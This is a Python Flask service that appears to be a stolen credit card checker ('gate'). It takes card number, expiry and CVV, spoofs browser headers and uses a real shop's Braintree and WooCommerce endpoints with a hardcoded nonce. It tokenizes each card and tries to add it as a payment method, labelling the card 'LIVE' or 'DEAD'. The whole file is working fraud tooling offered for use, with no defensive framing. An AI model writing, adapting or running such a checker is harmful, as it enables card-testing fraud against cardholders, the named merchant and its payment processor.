from flask import Flask, jsonify
import requests
import urllib.parse

app = Flask(__name__)

# Original site with enhanced headers
CLIENT_TOKEN_URL = "https://www.tea-and-coffee.com/wp-json/wc-braintree/v1/client-token"
ADD_PAYMENT_URL = "https://www.tea-and-coffee.com/wp-admin/admin-ajax.php"
_WPNONCE = "9deae5d2bc"

def get_client_token():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://www.tea-and-coffee.com',
            'Referer': 'https://www.tea-and-coffee.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }
        resp = requests.get(CLIENT_TOKEN_URL, headers=headers, timeout=10)
        print(f"Token Status: {resp.status_code}, Response: {resp.text}")  # Debug
        if resp.status_code == 200:
            return resp.json().get("data")
        return None
    except Exception as e:
        print(f"Token Error: {e}")
        return None

def create_nonce(cc, mm, yy, cvv, client_token):
    try:
        url = "https://payments.braintree-api.com/graphql"
        headers = {
            "Braintree-Version": "2019-01-01",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://assets.braintreegateway.com"
        }
        payload = {
            "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": "session_12345"},
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCards(input: $input) { paymentMethod { id } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvv
                    },
                    "clientToken": client_token
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        data = resp.json()
        print(f"Nonce Response: {data}")  # Debug
        if "data" in data and data["data"]["tokenizeCreditCards"]:
            return data["data"]["tokenizeCreditCards"]["paymentMethod"][0]["id"]
    except Exception as e:
        print(f"Nonce Error: {e}")
    return None

def add_payment_method(nonce):
    try:
        data = {
            'action': 'wc_braintree_add_payment_method',
            'payment_method_nonce': nonce,
            '_wpnonce': _WPNONCE
        }
        headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'x-requested-with': 'XMLHttpRequest',
            'origin': 'https://www.tea-and-coffee.com',
            'referer': 'https://www.tea-and-coffee.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        resp = requests.post(ADD_PAYMENT_URL, data=data, headers=headers, timeout=15)
        result = resp.json()
        print(f"Payment Response: {result}")  # Debug
        return result.get("success", False)
    except Exception as e:
        print(f"Payment Error: {e}")
        return False

@app.route('/gate=braintreeauth/cc=<path:cc>', methods=['GET'])
def check_braintree(cc):
    try:
        cc = urllib.parse.unquote(cc)
        parts = cc.split('|')
        if len(parts) != 4:
            return jsonify({"success": False, "data": {"error": {"message": "Invalid: cc|mm|yy|cvc"}}}), 400
        
        cc_num, mm, yy, cvv = [p.strip() for p in parts]
        
        # Step 1: Get Client Token
        client_token = get_client_token()
        if not client_token:
            return jsonify({"success": False, "data": {"error": {"message": "Token Error - Site Blocking"}}}), 500
        
        # Step 2: Create Nonce
        nonce = create_nonce(cc_num, mm, yy, cvv, client_token)
        if not nonce:
            return jsonify({"success": False, "data": {"error": {"message": "DEAD - Invalid Card"}}})
        
        # Step 3: Add Payment Method
        if add_payment_method(nonce):
            return jsonify({"success": True, "data": {"message": "LIVE - Card added!"}})
        else:
            return jsonify({"success": False, "data": {"error": {"message": "DEAD - Card declined!"}}})
    
    except Exception as e:
        return jsonify({"success": False, "data": {"error": {"message": f"Server Error: {str(e)}"}}}), 500

# Debug endpoint
@app.route('/test-token', methods=['GET'])
def test_token():
    token = get_client_token()
    return jsonify({"token_available": bool(token), "debug": "Check render logs for details"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
